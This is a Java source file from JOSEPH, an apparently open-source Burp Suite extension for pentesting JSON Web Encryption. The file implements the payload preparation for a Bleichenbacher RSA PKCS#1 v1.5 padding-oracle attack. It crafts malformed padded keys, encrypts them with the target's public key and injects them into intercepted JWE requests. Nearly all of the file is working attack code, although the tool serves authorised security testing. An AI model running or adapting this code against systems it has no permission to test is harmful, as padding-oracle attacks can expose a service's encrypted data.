/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks.BleichenbacherPkcs1;

import burp.*;
import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
import eu.dety.burp.joseph.attacks.IAttackInfo;
import eu.dety.burp.joseph.utilities.Decoder;
import eu.dety.burp.joseph.utilities.Jwk;
import eu.dety.burp.joseph.utilities.Logger;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.json.simple.parser.JSONParser;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.swing.*;
import java.awt.*;
import java.security.*;
import java.security.interfaces.RSAPublicKey;
import java.util.*;
import java.util.List;


/**
 * Bleichenbacher PKCS1 Attack Info
 * <p>
 * Class holding meta data for the Bleichenbacher RSA PKCS#1 v1.5 attack
 * and for preparing all necessary parameter for the actual attack.
 * <p>
 * Attack vector generation based on and code (partly) taken from WS-Attacker
 * @see <a href="https://github.com/RUB-NDS/WS-Attacker">WS-Attacker</a>
 *
 * @author Dennis Detering
 * @version 1.0
 */
public class BleichenbacherPkcs1Info implements IAttackInfo {
    private static final Logger loggerInstance = Logger.getInstance();
    private static final ResourceBundle bundle = ResourceBundle.getBundle("JOSEPH");

    private Decoder joseDecoder = new Decoder();
    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private IParameter parameter;

    // Unique identifier for the attack class
    private static final String id = "bleichenbarcher_pkcs1";

    // Full name of the attack
    private static final String name = "Bleichenbacher RSA PKCS#1 v1.5";

    // Attack description
    private static final String description = "<html>The <em>Bleichenbacher RSA PKCS#1 v1.5</em> attack exploits a vulnerability where ...</html>";

    // List of types this attack is suitable for
    private static final List<String> suitableTypes = Arrays.asList("jwe");

    // Array of algorithms to test
    private static final String[] algorithms = {"RSA1_5", "RSA-OAEP", "RSA-OAEP-256"};

    // Amount of requests needed
    private int amountRequests = 0;

    // Types of payload variation
    private enum payloadType {
        Original,
        NoNullByte,
        NullByteInPadding,
        NullByteInPkcsPadding,
        SymmetricKeyOfSize8,
        SymmetricKeyOfSize16,
        SymmetricKeyOfSize24,
        SymmetricKeyOfSize32,
        SymmetricKeyOfSize40,
        WrongFirstByte,
        WrongSecondByte
    }

    // Hashmap of available payloads with a verbose name (including the payloadType)
    private static final HashMap<String, payloadType> payloads = new HashMap<String, payloadType>() {{
        put(String.format("No Null Byte (0x%02X)", payloadType.NoNullByte.ordinal()), payloadType.NoNullByte);

        put(String.format("Null Byte in Padding (0x%02X)", payloadType.NullByteInPadding.ordinal()), payloadType.NullByteInPadding);
        put(String.format("Null Byte in PKCS Padding (0x%02X)", payloadType.NullByteInPkcsPadding.ordinal()), payloadType.NullByteInPkcsPadding);
        put(String.format("Symmetric Key of Size 8 (0x%02X)", payloadType.SymmetricKeyOfSize8.ordinal()), payloadType.SymmetricKeyOfSize8);
        put(String.format("Symmetric Key of Size 16 (0x%02X)", payloadType.SymmetricKeyOfSize16.ordinal()), payloadType.SymmetricKeyOfSize16);
        put(String.format("Symmetric Key of Size 24 (0x%02X)", payloadType.SymmetricKeyOfSize24.ordinal()), payloadType.SymmetricKeyOfSize24);
        put(String.format("Symmetric Key of Size 32 (0x%02X)", payloadType.SymmetricKeyOfSize32.ordinal()), payloadType.SymmetricKeyOfSize32);
        put(String.format("Symmetric Key of Size 40 (0x%02X)", payloadType.SymmetricKeyOfSize40.ordinal()), payloadType.SymmetricKeyOfSize40);
        put(String.format("Wrong First Byte (0x%02X)", payloadType.WrongFirstByte.ordinal()), payloadType.WrongFirstByte);
        put(String.format("Wrong Second Byte (0x%02X)", payloadType.WrongSecondByte.ordinal()), payloadType.WrongSecondByte);
    }};

    // List of prepared requests with payload info
    private List<BleichenbacherPkcs1AttackRequest> requests = new ArrayList<>();

    private JComboBox<String> publicKeySelection;
    private JTextArea publicKey;

    public BleichenbacherPkcs1Info(IBurpExtenderCallbacks callbacks) {
        this.helpers = callbacks.getHelpers();
    }

    @Override
    public BleichenbacherPkcs1 prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, IParameter parameter) throws AttackPreparationFailedException {
        this.requestResponse = requestResponse;
        this.parameter = parameter;

        this.requests.clear();

        String publicKeyValue = publicKey.getText();

        // Throw error if public key value is empty
        if(publicKeyValue.isEmpty()) {
            throw new AttackPreparationFailedException(bundle.getString("PROVIDE_PUBKEY"));
        }

        RSAPublicKey publicKey;
        try {
            Object publickKeyValueJson = new JSONParser().parse(publicKeyValue);
            List<PublicKey> publicKeys = Jwk.getRsaPublicKeys(publickKeyValueJson);
            publicKey = (RSAPublicKey)publicKeys.get(0);

        } catch (Exception e) {
            throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
        }

        // TODO: Support PEM
//        // Parse public key according to selected format
//        int publicKeyFormat = publicKeySelection.getSelectedIndex();
//
//        switch (publicKeyFormat) {
//            // JWK (JSON)
//            case 1:
//                loggerInstance.log(getClass(), "Key format is JWK:  " + publicKeyValue, Logger.LogLevel.DEBUG);
//
//                try {
//                    Object publickKeyValueJson = new JSONParser().parse(publicKeyValue);
//                    List<PublicKey> publicKeys = Jwk.getRsaPublicKeys(publickKeyValueJson);
//                    publicKey = (RSAPublicKey)publicKeys.get(0);
//
//                } catch (Exception e) {
//                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
//                }
//
//                break;
//            // PEM (String)
//            default:
//                loggerInstance.log(getClass(), "Key format is PEM:  " + publicKeyValue, Logger.LogLevel.DEBUG);
//
//                try {
//                    X509EncodedKeySpec keySpec = new X509EncodedKeySpec(Base64.decodeBase64(publicKeyValue));
//                    KeyFactory keyFactory = KeyFactory.getInstance("RSA");
//                    publicKey = (RSAPublicKey)keyFactory.generatePublic(keySpec);
//
//
//                } catch (Exception e) {
//                    loggerInstance.log(getClass(), "Error on transforming to RSAPublicKey:  " + e.getMessage(), Logger.LogLevel.ERROR);
//                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
//                }
//
//        }

        HashMap<payloadType, byte[]> encryptedKeys;

        try {
            encryptedKeys = generatePkcs1Vectors(publicKey, 32);

        } catch(Exception e) {
            throw new AttackPreparationFailedException(e.getMessage());
        }

        // Prepare requests
        for(Map.Entry<payloadType, byte[]> cek: encryptedKeys.entrySet()) {
            byte[] request = this.requestResponse.getRequest();
            String[] components = joseDecoder.getComponents(this.parameter.getValue());
            components[1] = joseDecoder.base64UrlEncode(cek.getValue());

            String newComponentsConcatenated = joseDecoder.concatComponents(components);

            IParameter updatedParameter = helpers.buildParameter(this.parameter.getName(), newComponentsConcatenated, this.parameter.getType());
            request = helpers.updateParameter(request, updatedParameter);

            requests.add(new BleichenbacherPkcs1AttackRequest(request, cek.getKey().ordinal(), cek.getValue(), cek.getKey().name()));
            loggerInstance.log(getClass(), "Generated CEK: " + joseDecoder.base64UrlEncode(cek.getValue()), Logger.LogLevel.DEBUG);
        }

        this.amountRequests = requests.size();
        return new BleichenbacherPkcs1(callbacks, this);
    }

    @Override
    public String getId() {
        return id;
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public String getDescription() {
        return description;
    }

    @Override
    public List<String> getSuitableTypes() {
        return suitableTypes;
    }

    @Override
    public int getAmountRequests() {
        return amountRequests;
    }

    @Override
    public boolean getExtraUI(JPanel extraPanel, GridBagConstraints constraints) {
        // Create combobox and textarea to add public key (in different formats)
        JLabel publicKeyLabel = new JLabel(bundle.getString("PUBKEY_FORMAT"));
        publicKeySelection = new JComboBox<>();
        DefaultComboBoxModel<String> publicKeySelectionListModel= new DefaultComboBoxModel<>();
        publicKey = new JTextArea(10, 50);
        publicKey.setLineWrap(true);

        // publicKeySelectionListModel.addElement("PEM (String)");
        publicKeySelectionListModel.addElement("JWK (JSON)");

        publicKeySelection.setModel(publicKeySelectionListModel);

        constraints.gridy = 0;
        extraPanel.add(publicKeyLabel, constraints);

        constraints.gridy = 1;
        extraPanel.add(publicKeySelection, constraints);

        constraints.gridy = 2;
        extraPanel.add(publicKey, constraints);

        return true;
    }

    @Override
    public boolean isSuitable(String type, String algorithm) {
        return true;
    }

    @Override
    public IHttpRequestResponse getRequestResponse() {
        return this.requestResponse;
    }

    @Override
    public List<BleichenbacherPkcs1AttackRequest> getRequests() {
        return this.requests;
    }

    @Override
    public HashMap<String, payloadType> getPayloadList() {
        return payloads;
    }

    @Override
    public HashMap<String, String> updateValuesByPayload(Enum payloadTypeId, String header, String payload) throws AttackPreparationFailedException {
        HashMap<String, String> result = new HashMap<>();

        return result;
    }

    /**
     * Generate different encrypted PKCS1 vectors
     *
     * @param publicKey Public key
     * @param keySize Key size
     * @return Hashmap of encrypted padded keys and according payload type
     */
    private HashMap<payloadType, byte[]> generatePkcs1Vectors(RSAPublicKey publicKey, int keySize) {
        // Generate random key
        Random random = new Random();
        byte[] keyBytes = new byte[keySize];
        random.nextBytes(keyBytes);

        int rsaKeyLength = publicKey.getModulus().bitLength() / 8;

        HashMap<payloadType, byte[]> encryptedKeys = new HashMap<>();

        try {
            Security.addProvider(new BouncyCastleProvider());
            Cipher rsa = Cipher.getInstance("RSA/NONE/NoPadding");
            rsa.init(Cipher.ENCRYPT_MODE, publicKey);

            // create plain padded key and encrypt them
            encryptedKeys.put(payloadType.NoNullByte, rsa.doFinal(getEK_NoNullByte(rsaKeyLength, keyBytes)));
            encryptedKeys.put(payloadType.NullByteInPadding, rsa.doFinal(getEK_NullByteInPadding(rsaKeyLength, keyBytes)));
            encryptedKeys.put(payloadType.NullByteInPkcsPadding, rsa.doFinal(getEK_NullByteInPkcsPadding(rsaKeyLength, keyBytes)));
            encryptedKeys.put(payloadType.SymmetricKeyOfSize16, rsa.doFinal(getEK_SymmetricKeyOfSize16(rsaKeyLength, keyBytes)));
            encryptedKeys.put(payloadType.SymmetricKeyOfSize24, rsa.doFinal(getEK_SymmetricKeyOfSize24(rsaKeyLength, keyBytes)));
            encryptedKeys.put(payloadType.SymmetricKeyOfSize32, rsa.doFinal(getEK_SymmetricKeyOfSize32(rsaKeyLength, keyBytes)));
            encryptedKeys.put(payloadType.SymmetricKeyOfSize40, rsa.doFinal(getEK_SymmetricKeyOfSize40(rsaKeyLength, keyBytes)));
            encryptedKeys.put(payloadType.SymmetricKeyOfSize8, rsa.doFinal(getEK_SymmetricKeyOfSize8(rsaKeyLength, keyBytes)));
            encryptedKeys.put(payloadType.WrongFirstByte, rsa.doFinal(getEK_WrongFirstByte(rsaKeyLength, keyBytes)));
            encryptedKeys.put(payloadType.WrongSecondByte, rsa.doFinal(getEK_WrongSecondByte(rsaKeyLength, keyBytes)));
            encryptedKeys.put(payloadType.Original, rsa.doFinal(getPaddedKey(rsaKeyLength, keyBytes)));

        } catch (BadPaddingException | IllegalBlockSizeException | InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException e) {
            loggerInstance.log(getClass(), "Error during key encryption: " + e.getMessage(), Logger.LogLevel.ERROR);
        }

        return encryptedKeys;
    }

    /**
     * Generate a validly padded message
     *
     * @param rsaKeyLength rsa key length in bytes
     * @param symmetricKey symmetric key in bytes
     * @return The padded key
     */
    private static byte[] getPaddedKey(int rsaKeyLength, byte[] symmetricKey)  {
        byte[] key = new byte[rsaKeyLength];
        // fill all the bytes with non-zero values
        Arrays.fill(key, (byte) 42);
        // set the first byte to 0x00
        key[0] = 0x00;
        // set the second byte to 0x02
        key[1] = 0x02;
        // set the separating byte
        key[rsaKeyLength - symmetricKey.length - 1] = 0x00;
        // copy the symmetric key to the field
        System.arraycopy(symmetricKey, 0, key, rsaKeyLength - symmetricKey.length, symmetricKey.length);

        return key;
    }

    private static byte[] getEK_NoNullByte(int rsaKeyLength, byte[] symmetricKey)  {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);

        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00)  {
                key[i] = 0x01;
            }
        }
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with no separating byte.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_WrongFirstByte(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
        key[0] = 23;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a wrong first byte.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_WrongSecondByte(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
        key[1] = 23;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a wrong second byte.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_NullByteInPkcsPadding(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        key[3] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a 0x00 byte in the PKCS1 padding.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_NullByteInPadding(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
        key[11] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded message with a 0x00 byte in padding.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize40(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );
        key[rsaKeyLength - 40 - 1] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 40.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize32(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );

        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        key[rsaKeyLength - 32 - 1] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 32.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize24(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );

        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        key[rsaKeyLength - 24 - 1] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 24.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize16(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );

        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        key[rsaKeyLength - 16 - 1] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 16.", Logger.LogLevel.DEBUG);
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize8(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey( rsaKeyLength, symmetricKey );

        for ( int i = 3; i < key.length; i++ ) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        key[rsaKeyLength - 8 - 1] = 0x00;
        loggerInstance.log(BleichenbacherPkcs1Info.class, "Generated a PKCS1 padded symmetric key of size 8.", Logger.LogLevel.DEBUG);
        return key;
    }

}
